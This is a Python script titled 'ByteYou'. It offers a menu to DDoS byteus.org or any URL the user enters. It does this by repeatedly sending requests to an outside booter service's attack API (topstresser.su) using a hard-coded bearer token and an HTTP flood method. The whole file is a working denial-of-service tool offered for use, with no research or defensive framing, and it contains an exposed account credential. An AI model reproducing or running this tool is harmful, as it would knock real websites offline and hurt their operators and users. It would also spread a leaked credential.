import requests
import time
import os
from colorama import Fore, Style, init

# Initialize colorama for styled text
init(autoreset=True)

os.system("")

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_menu():
    """Print the main menu."""
    clear_screen()
    print(Fore.GREEN + Style.BRIGHT + """
██████╗░██╗░░░██╗████████╗███████╗  ██╗░░░██╗░█████╗░██╗░░░██╗
██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝  ╚██╗░██╔╝██╔══██╗██║░░░██║
██████╦╝░╚████╔╝░░░░██║░░░█████╗░░  ░╚████╔╝░██║░░██║██║░░░██║
██╔══██╗░░╚██╔╝░░░░░██║░░░██╔══╝░░  ░░╚██╔╝░░██║░░██║██║░░░██║
██████╦╝░░░██║░░░░░░██║░░░███████╗  ░░░██║░░░╚█████╔╝╚██████╔╝
╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝  ░░░╚═╝░░░░╚════╝░░╚═════╝░
                                This shitty script was developed by GeorgeDroyd/FloydTerminal. https://github.com/FloydTerminal
    """)
    print("[1] DDOS Byteus.org")
    print("[2] DDOS Custom URL")
    print("[3] Exit")

def send_request(target_url, interval):
    """Send a POST request repeatedly."""
    url = "https://www.topstresser.su/api/attack"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Link": "e-tag",
        "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTI3LjAuMC4xOjgwMDAvYXBpL3JlZ2lzdGVyIiwiaWF0IjoxNzM1OTMyNDc2LCJleHAiOjE3MzY1MzcyNzYsIm5iZiI6MTczNTkzMjQ3NiwianRpIjoiTHlCSTdFODFpWjc4TmZpdSIsInN1YiI6IjI2MjgiLCJwcnYiOiJmNjRkNDhhNmNlYzdiZGZhN2ZiZjg5OTQ1NGI0ODhiM2U0NjI1MjBhIn0.fTDOXUbkNSUwLh0Po4pqPn8BZq-WYDhqetBLsfn6hfU",
        "Content-Type": "text/plain;charset=UTF-8",
        "Alt-Used": "www.topstresser.su",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    }
    data = {
        "target": target_url,
        "port": "",
        "time": 120,
        "concurrents": 1,
        "method": "HTTP-FREE"
    }

    try:
        while True:
            response = requests.post(url, headers=headers, json=data)
            print(Fore.YELLOW + f"[INFO] Request Sent to {target_url}. Response Code: {response.status_code}")
            if response.text:
                print(Fore.WHITE + response.text)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[INFO] Stopping requests.")

def main():
    """Main function to handle the menu and options."""
    while True:
        print_menu()
        choice = input(Fore.WHITE + "\nChoose an option: ")
        if choice == "1":
            print(Fore.CYAN + "\nEnter repeat interval in seconds (default: 60):")
            try:
                interval = int(input(Fore.WHITE + ">>> "))
            except ValueError:
                interval = 60
            send_request("https://byteus.org", interval)
        elif choice == "2":
            print(Fore.CYAN + "\nEnter the target URL:")
            target_url = input(Fore.WHITE + ">>> ")
            print(Fore.CYAN + "\nEnter repeat interval in seconds (default: 60):")
            try:
                interval = int(input(Fore.WHITE + ">>> "))
            except ValueError:
                interval = 60
            send_request(target_url, interval)
        elif choice == "3":
            print(Fore.GREEN + "\nThank you for using ByteYou. Goodbye!\n")
            break
        else:
            print(Fore.RED + "\nInvalid choice. Please try again.\n")
            time.sleep(2)

if __name__ == "__main__":
    main()
